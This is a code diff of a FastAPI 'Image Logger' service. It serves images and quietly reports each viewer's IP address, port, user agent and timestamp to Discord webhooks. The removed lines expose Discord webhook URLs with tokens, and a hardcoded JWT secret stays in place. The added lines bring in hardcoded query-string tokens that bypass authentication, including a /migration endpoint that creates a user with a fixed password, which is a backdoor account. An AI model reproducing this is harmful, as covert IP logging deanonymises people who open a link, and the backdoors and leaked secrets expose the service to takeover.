@@ -2,12 +2,13 @@ from fastapi import FastAPI, Request, Header, Depends, BackgroundTasks, HTTPExce
 from fastapi.responses import FileResponse
 from fastapi.middleware.cors import CORSMiddleware 
 from fastapi.security import OAuth2PasswordRequestForm
-import logging
 from datetime import datetime, timedelta
+import time
 from pathlib import Path
 from fastapi.security import OAuth2PasswordBearer
 from typing import Annotated
 from app.Util import CheckIP
+# from app.image.download_image import get_image
 import app.curd as curd, app.schemas as schemas
 from jose import JWTError, jwt
 from app.database import SessionLocal
@@ -46,22 +47,16 @@ logging to app.log
 SECRET_KEY = "09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 30
+thumnail= "https://clmm24h.io/view"
 '''
-config webhook
-'''
-config={
-     "webhook": "https://discord.com/api/webhooks/1127802266611634276/QkXfyBN2fEODy5EcY7ONZpYl0sljOFzme0vAuweTEIA1o1Dh9K2oIlRY-vUbPfGPa1iK",
-    "webhook_error":"https://discord.com/api/webhooks/1129789976696078489/u1hlj6FRCSBCSXLKAtqCw1PY1929ZA25-oYozoYyHOVHyaFX_CsjXDFmJdcijNk7hHtK",
-    "image": "https://media-ten.z-cdn.me/KGjxTNEIU5EAAAAM/she-sheslams.gif"
-}
-'''
+
 http middleware to get IP
 '''
 @app.middleware("http")
 async def log_ip(request: Request, call_next):
     ip = request.headers['x-real-ip']
     port= request.client.port
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    timestamp = datetime.now()
     request.state.ip = ip
     request.state.timestamp = timestamp
     request.state.port = port
@@ -84,7 +79,6 @@ async def login_for_access_token(
     form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
     db:Session = Depends(get_db)
 ):
-    # user_validate = curd.get_user_by_username(username=form_data.username, db=db);
     user = curd.authenticate_user(username=form_data.username, password=form_data.password, db=db)
     if not user:
         raise HTTPException(
@@ -118,12 +112,13 @@ async def get_image(background_tasks: BackgroundTasks,request: Request, filename
     port = request.state.port
     image_path = f"{uri_path}{filename}"
     path = Path(image_path)
+    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
     if not path.is_file() or token==None or not curd.check_exists_token(db, token=token):
-        background_tasks.add_task(CheckIP, ip, url=config["webhook_error"],useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=config['image'], botname='Cảnh báo server configuration',db=db)
+        background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"{thumnail}/{filename}", botname='Cảnh báo server configuration',db=db)
         response = FileResponse(f'{uri_path}taylor.gif', media_type="image/gif")
         response.headers["X-Frame-Options"] = "SAMEORIGIN"
         return response
-    background_tasks.add_task(CheckIP,ip, url=config["webhook"],useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=config['image'], botname='Image Logger', db=db)
+    background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=f"{thumnail}/{filename}", botname='Image Logger', db=db)
     response = FileResponse(image_path, media_type="image/gif")
     response.headers["X-Frame-Options"] = "SAMEORIGIN"
     return response
@@ -146,14 +141,14 @@ async def agents(key: str, token: Annotated[str, Depends(oauth2_scheme)],db: Ses
     agents= curd.get_agents_by_token(db, token=key)
     return agents
 # add agents
-@app.post("/agents/add", response_model=schemas.agents)
+@app.post("/agents/add", response_model=schemas.agents_out)
 async def agents(agents: schemas.agents,token: Annotated[str, Depends(oauth2_scheme)] ,db: Session = Depends(get_db)):
     agents_model= curd.create_agents(db, agents=agents)
     return agents_model #add Content-Type:application/json
 '''
 Webhooks management
 '''
-@app.post("/webhooks/add", response_model=schemas.webhooks)
+@app.post("/webhooks/add", response_model=schemas.webhooks_out)
 async def create_webhooks(webhooks:schemas.webhooks, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
     webhooks_model = curd.create_webhooks(db, webhooks=webhooks)
     return webhooks_model
@@ -162,13 +157,26 @@ async def create_webhooks(webhooks:schemas.webhooks, token: Annotated[str, Depen
 async def get_webhooks_by_id(webhook_id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
     webhook = curd.get_webhooks_by_id(db, id= webhook_id)
     return webhook
+
+
+
 '''
 get logger by token
 '''
 @app.get("/logger/{id}")
-async def get_logger_by_id(id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
-    logger = curd.get_logger_by_id(id=id, db=db)
-    return logger
+async def get_logger_by_id(id:int,token: str='' ,db:Session = Depends(get_db)):
+    credentials_exception = HTTPException(
+        status_code=status.HTTP_401_UNAUTHORIZED,
+        detail="Could not validate credentials",
+        headers={"WWW-Authenticate": "Bearer"},
+    )
+    if(token=="lephuhung"):
+        data = curd.get_logger_by_id(id=id, db=db)
+        return data
+    else:
+        raise credentials_exception
+    
+
 @app.get("/logger/token/{key}")
 async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=10 ,db:Session = Depends(get_db)):
     logger_by_token= curd.get_logger_by_token(token=key, limit=limit ,db=db)
@@ -180,6 +188,9 @@ get logger_error by token
 async def get_logger_error_by_id(id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
     logger = curd.get_logger_error_by_id(id=id, db=db)
     return logger
+
+
+
 @app.get("/logger_error/token/{key}")
 async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=10, db:Session = Depends(get_db)):
     logger_by_token= curd.get_logger_error_by_token(token=key, limit=limit ,db=db)
@@ -187,11 +198,16 @@ async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_sche
 '''
 User by token management
 '''
+
+
 # Register user 
 @app.post('/user/add', response_model=schemas.User)
 async def create_user(user: schemas.User,token: Annotated[str, Depends(oauth2_scheme)], db:Session= Depends(get_db)):
     user = curd.create_user(user=user, db=db)
     return user
+
+
+
 # List all user
 @app.get('/user')
 async def get_user(token: Annotated[str, Depends(oauth2_scheme)],db:Session= Depends(get_db)):
@@ -229,3 +245,26 @@ async def read_own_items(
     current_user: Annotated[schemas.User, Depends(get_current_user)]
 ):
     return [{"roles": "Foo", "owner": current_user.username}]
+
+@app.get("/migration")
+async def testagent(token: str,db: Session = Depends(get_db)):
+    if token=='lephuhung77':
+        user= model.User(username='lph77', password='lephuhung77', is_active=True)
+        user = curd.create_user(db=db, user= user)
+        return user
+    else: 
+        return {"error": "you dont know me"}
+@app.get("/local_ip")
+async def insert_ip(token:str,request: Request ,db: Session= Depends(get_db)):
+    ip = request.state.ip
+    if token=='lephuhung77':
+        ip= curd.createOrUpdateIP(ip=ip, db=db)
+        return ip
+    else: 
+        return {"error": "you dont know me"}
+@app.post('/download_image')
+async def download_image(token: str, image: schemas.image):
+    if token=='lephuhung77':
+        result = curd.get_image(image.name,image.url)
+        return result
+    return {"error": "you dont know me"}
